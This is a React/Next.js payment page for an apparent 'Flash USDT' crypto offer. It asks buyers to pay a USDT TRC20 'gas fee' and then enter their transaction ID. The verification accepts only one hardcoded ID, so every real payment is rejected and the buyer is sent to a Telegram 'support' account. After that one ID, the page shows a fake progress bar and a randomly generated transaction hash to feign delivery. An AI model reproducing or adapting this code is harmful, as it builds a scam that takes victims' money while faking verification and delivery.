"use client"

import { useEffect, useMemo, useState } from "react"
import Link from "next/link"
import Image from "next/image"
import trc20QR from "@/public/images/trc20-qr.png"
import { Card, CardContent } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Label } from "@/components/ui/label"
import { Input } from "@/components/ui/input"
import { CopyButton } from "@/components/pay/copy-button"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog"
import { Progress } from "@/components/ui/progress"

const ALLOWED_TRX_ID = "TWixjgccN18MuGhdidsiXR2PBNx4koy8feN49fAEL9gz3os83bkakKwu828Jg97nJbvKJwj7293uy3i3y3i"

export default function VerifyAndComplete({
  asset,
  tier,
  price,
  address,
}: {
  asset: string
  tier: string
  price: string
  address: string
}) {
  const [txId, setTxId] = useState("")
  const [txError, setTxError] = useState<string | null>(null)

  const [walletOpen, setWalletOpen] = useState(false)
  const [wallet, setWallet] = useState("")
  const [walletError, setWalletError] = useState<string | null>(null)

  const [step, setStep] = useState<"instructions" | "processing" | "success">("instructions")
  const [progress, setProgress] = useState(0)
  const [dummyHash, setDummyHash] = useState("")

  const assetLabel = useMemo(() => asset.toUpperCase(), [asset])

  function handleVerify() {
    const id = txId.trim()
    if (id !== ALLOWED_TRX_ID) {
      setTxError("Invalid TRX ID! Contact the Support team.")
      return
    }
    setTxError(null)
    setWalletOpen(true)
  }

  function submitWallet() {
    if (!wallet || wallet.trim().length < 8) {
      setWalletError("Please enter your receiving wallet address.")
      return
    }
    setWalletError(null)
    setWalletOpen(false)
    setStep("processing")
  }

  useEffect(() => {
    if (step === "processing") {
      const chars = "abcdef0123456789"
      let out = "0x"
      for (let i = 0; i < 64; i++) out += chars[Math.floor(Math.random() * chars.length)]
      setDummyHash(out)
      setProgress(0)
      const start = Date.now()
      const total = 6000
      const id = setInterval(() => {
        const pct = Math.min(100, Math.round(((Date.now() - start) / total) * 100))
        setProgress(pct)
        if (pct >= 100) {
          clearInterval(id)
          setStep("success")
        }
      }, 150)
      return () => clearInterval(id)
    }
  }, [step])

  return (
    <>
      <div className="mb-8">
        <h1 className="text-3xl md:text-4xl font-semibold">Payment Instructions</h1>
        <p className="text-muted-foreground mt-2">
          To complete your {assetLabel} package ({tier}), please pay the gas fee via USDT TRC20.
        </p>
      </div>

      {step === "instructions" && (
        <Card className="bg-card/70 border-border/60 shadow-lg">
          <CardContent className="p-6 space-y-6">
            <div className="grid gap-6 md:grid-cols-2">
              {/* QR section */}
              <div className="rounded-lg border border-border/60 bg-muted/10 p-4 flex items-center justify-center">
                <Image
                  src={trc20QR || "/placeholder.svg"}
                  alt="USDT TRC20 payment QR"
                  className="h-48 w-48 object-contain"
                  width={192}
                  height={192}
                />
              </div>

              {/* Details and copy */}
              <div className="space-y-4">
                <div className="grid gap-1">
                  <span className="text-sm text-muted-foreground">Amount (gas fee)</span>
                  <div className="text-2xl font-semibold">${price} USDT (TRC20)</div>
                </div>

                <div className="grid gap-1">
                  <span className="text-sm text-muted-foreground">Network</span>
                  <div className="font-medium">TRON TRC20</div>
                </div>

                <div className="grid gap-1">
                  <span className="text-sm text-muted-foreground">Destination Address</span>
                  <div className="flex items-center justify-between gap-2 rounded-lg border border-border/60 bg-background px-3 py-2">
                    <code className="text-sm break-all">{address}</code>
                    <CopyButton value={address} />
                  </div>
                </div>
              </div>
            </div>

            <ul className="list-disc pl-5 text-sm text-muted-foreground space-y-2">
              <li>
                Send exactly <span className="font-medium">${price} USDT</span> on TRC20.
              </li>
              <li>Network fees are paid by sender. Keep the transaction hash for support.</li>
              <li>Orders typically confirm within minutes after on-chain validation.</li>
            </ul>

            {/* TRX ID verification */}
            <div className="grid gap-3 pt-2">
              <div className="grid gap-2">
                <Label htmlFor="txid">Transaction ID (TRC20 hash)</Label>
                <Input id="txid" placeholder="Paste your TxID" value={txId} onChange={(e) => setTxId(e.target.value)} />
                {txError ? (
                  <div className="flex items-center gap-2">
                    <p className="text-sm text-destructive">{txError}</p>
                    <Button asChild size="sm" variant="outline">
                      <Link href="https://t.me/Qxsof" target="_blank" rel="noopener noreferrer">
                        Telegram Support
                      </Link>
                    </Button>
                  </div>
                ) : null}
              </div>

              <div className="flex flex-col sm:flex-row gap-3">
                <Button className="premium-btn" onClick={handleVerify}>
                  Verify Payment
                </Button>
                <Button asChild variant="outline">
                  <Link href="/get">Choose Another Package</Link>
                </Button>
                <Button asChild variant="outline">
                  <Link href="https://t.me/Qxsof" target="_blank" rel="noopener noreferrer">
                    Contact Support
                  </Link>
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>
      )}

      {step === "processing" && (
        <Card className="bg-card/70 border-border/60 shadow-lg mt-8">
          <CardContent className="p-8 space-y-6">
            <div>
              <h2 className="text-2xl font-semibold">Processing your order</h2>
              <p className="text-muted-foreground mt-2">
                Verifying payment and preparing delivery of {tier} Flash {assetLabel}. This may take 5–10 seconds.
              </p>
            </div>
            <Progress value={progress} className="h-2" />
            <p className="text-sm text-muted-foreground" aria-live="polite">
              Status: {progress < 100 ? "In progress" : "Finalizing"} ({progress}%)
            </p>
          </CardContent>
        </Card>
      )}

      {step === "success" && (
        <Card className="bg-card/70 border-border/60 shadow-xl mt-8">
          <CardContent className="p-8 space-y-6">
            <div className="space-y-2">
              <h2 className="text-2xl font-semibold text-green-600">Success</h2>
              <p className="text-pretty">
                {tier} Flash {assetLabel} successfully sent to <span className="font-semibold">{wallet}</span>.
              </p>
              <p className="text-sm text-muted-foreground">
                Your transaction hash is <code className="rounded bg-muted/40 px-2 py-1">{dummyHash}</code>.
              </p>
            </div>

            <div className="flex flex-wrap gap-3">
              <Button asChild className="premium-btn">
                <Link href="/get">Get More</Link>
              </Button>
              <Button asChild variant="outline">
                <Link href="/">Back to Home</Link>
              </Button>
              <Button asChild variant="outline">
                <Link href="https://t.me/Qxsof" target="_blank" rel="noopener noreferrer">
                  Contact Support
                </Link>
              </Button>
            </div>
          </CardContent>
        </Card>
      )}

      {/* Wallet popup */}
      <Dialog open={walletOpen} onOpenChange={setWalletOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>Enter your receiving wallet</DialogTitle>
            <DialogDescription>
              Provide the wallet address where you want to receive your {tier} Flash {assetLabel}.
            </DialogDescription>
          </DialogHeader>
          <div className="grid gap-2">
            <Label htmlFor="wallet">Your wallet address</Label>
            <Input
              id="wallet"
              placeholder="Your wallet address"
              value={wallet}
              onChange={(e) => setWallet(e.target.value)}
            />
            {walletError ? <p className="text-sm text-destructive">{walletError}</p> : null}
          </div>
          <DialogFooter className="gap-2 sm:gap-0">
            <Button variant="outline" onClick={() => setWalletOpen(false)}>
              Cancel
            </Button>
            <Button className="premium-btn" onClick={submitWallet}>
              Submit
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </>
  )
}
